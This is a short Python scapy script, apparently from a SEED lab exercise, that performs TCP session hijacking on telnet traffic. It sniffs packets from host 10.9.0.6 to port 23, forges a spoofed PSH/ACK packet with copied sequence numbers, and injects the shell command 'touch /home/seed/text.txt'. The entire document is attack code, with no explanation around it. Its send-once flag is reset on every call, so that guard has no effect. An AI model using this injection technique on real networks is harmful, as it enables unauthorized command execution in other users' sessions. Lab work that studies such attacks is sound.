#!/usr/bin/env python3


from scapy.all import *


def hijacktxtauto(pkt):
  pkt_sent = False
  if pkt.haslayer(IP) and pkt[IP].src == "10.9.0.6" and pkt.dport == 23 and pkt_sent == False:
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA", seq=pkt[TCP].ack, ack=pkt[TCP].seq)
    data = "touch /home/seed/text.txt\r\n" 
    new_pkt = ip/tcp/data 
    ls(new_pkt)
    send(new_pkt,iface="br-d66b420496b4",verbose=0)
    pkt_sent = True
   
sniff(iface="br-d66b420496b4",prn=hijacktxtauto)



